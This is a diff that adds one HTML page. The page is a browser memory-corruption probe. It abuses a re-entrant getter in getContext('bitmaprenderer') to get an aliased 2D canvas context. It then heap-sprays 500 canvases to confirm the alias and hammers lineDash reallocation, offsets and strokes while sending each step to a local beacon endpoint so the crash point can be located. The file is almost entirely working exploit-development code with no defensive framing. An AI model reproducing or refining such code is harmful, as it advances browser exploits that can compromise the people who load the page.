@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V958B</title></head>
+<body><pre id="out">V958B — alias lineDash realloc/offset/stroke oracle (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V958B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}}
+function snap(ctx,tag){
+  try{
+    var ld=ctx.getLineDash();
+    var off=('lineDashOffset' in ctx)?ctx.lineDashOffset:'na';
+    var tail=ld.length?ld[ld.length-1]:'-';
+    bk(tag,'len='+ld.length+'|v0='+(ld.length?ld[0]:'-')+'|tail='+tail+'|off='+off+'|lw='+ctx.lineWidth);
+    return ld;
+  }catch(e){ bk(tag+'-ERR',String(e&&e.name)+':'+String(e&&e.message||e).slice(0,140)); return null; }
+}
+async function establishAlias(){
+  bk('BOOT','alias V573-style; lineDash grow/shrink realloc + lineDashOffset + stroke/fillRect oracle. step-beaconed; crash=last PRE');
+  var inner=null;
+  var c=document.createElement('canvas'); c.width=64; c.height=64;
+  var settings={};
+  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
+  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
+  if(!inner){ bk('NO-INNER',''); return null; }
+  bk('INNER','ok');
+  var spray=[];
+  for(var i=0;i<500;i++){
+    var c2=document.createElement('canvas'); c2.width=64; c2.height=64;
+    var g=c2.getContext('2d');
+    g.lineWidth = 1000 + i;
+    spray.push({c:c2,g:g});
+  }
+  bk('SPRAY','500');
+  var found=-1, alias=null;
+  try{ inner.lineWidth=8888.88; }catch(e){ bk('W1-ERR',String(e)); return null; }
+  for(var i=0;i<spray.length;i++){
+    try{ if(Math.abs(spray[i].g.lineWidth-8888.88)<0.01){ found=i; alias=spray[i].g; break; } }catch(e){}
+  }
+  bk('ALIAS', found>=0?('idx='+found):'MISS');
+  if(!alias) return null;
+  return {inner:inner, alias:alias};
+}
+function mkDash(n,base){ var a=[]; for(var i=0;i<n;i++) a.push(base+i+0.25); return a; }
+(async function(){
+  var a=await establishAlias();
+  if(!a){ bk('DONE','no-alias/stop'); say('no alias'); return; }
+  var al=a.alias;
+  // S0 baseline
+  bk('S0-PRE','setLineDash([1,2,3,4]) off=0');
+  try{ al.setLineDash([1,2,3,4]); if('lineDashOffset' in al) al.lineDashOffset=0; }catch(e){ bk('S0-ERR',String(e)); }
+  snap(al,'S0');
+  // S1 lineDashOffset variations
+  var offs=[0,1,7.5,-3,1000,1e12,NaN,Infinity];
+  for(var i=0;i<offs.length;i++){
+    bk('S1-PRE','off='+String(offs[i]));
+    try{ if('lineDashOffset' in al) al.lineDashOffset=offs[i]; }catch(e){ bk('S1-ERR',String(e)); }
+    snap(al,'S1-'+i);
+  }
+  // S2 grow realloc
+  bk('S2a-PRE','setLineDash(256)');
+  try{ al.setLineDash(mkDash(256,1)); }catch(e){ bk('S2a-ERR',String(e)); }
+  snap(al,'S2a');
+  bk('S2b-PRE','setLineDash(1024)');
+  try{ al.setLineDash(mkDash(1024,10)); }catch(e){ bk('S2b-ERR',String(e)); }
+  snap(al,'S2b');
+  // S3 shrink
+  bk('S3a-PRE','setLineDash(8)');
+  try{ al.setLineDash(mkDash(8,5)); }catch(e){ bk('S3a-ERR',String(e)); }
+  snap(al,'S3a');
+  bk('S3b-PRE','setLineDash([])');
+  try{ al.setLineDash([]); }catch(e){ bk('S3b-ERR',String(e)); }
+  snap(al,'S3b');
+  bk('S3c-PRE','setLineDash([9,9])');
+  try{ al.setLineDash([9,9]); }catch(e){ bk('S3c-ERR',String(e)); }
+  snap(al,'S3c');
+  // S4 interleave dash + stroke
+  bk('S4-PRE','bigDash+stroke+smallDash+stroke');
+  try{
+    al.setLineDash(mkDash(512,3));
+    al.beginPath(); al.moveTo(0,0); al.lineTo(64,64); al.stroke();
+    snap(al,'S4a');
+    al.setLineDash([2,4]);
+    al.beginPath(); al.moveTo(64,0); al.lineTo(0,64); al.stroke();
+    snap(al,'S4b');
+  }catch(e){ bk('S4-ERR',String(e)); }
+  // S5 fill/stroke rect with dash
+  bk('S5-PRE','rect ops');
+  try{
+    al.setLineDash(mkDash(128,7));
+    al.strokeRect(1,1,30,30);
+    al.fillRect(2,2,10,10);
+    al.setLineDash([]);
+    al.strokeRect(5,5,20,20);
+  }catch(e){ bk('S5-ERR',String(e)); }
+  snap(al,'S5');
+  bk('DONE','realloc/offset/stroke oracle complete; inconsistent len/tail/crash => corruption signal');
+  say('done');
+})();
+</script>
+</body></html>
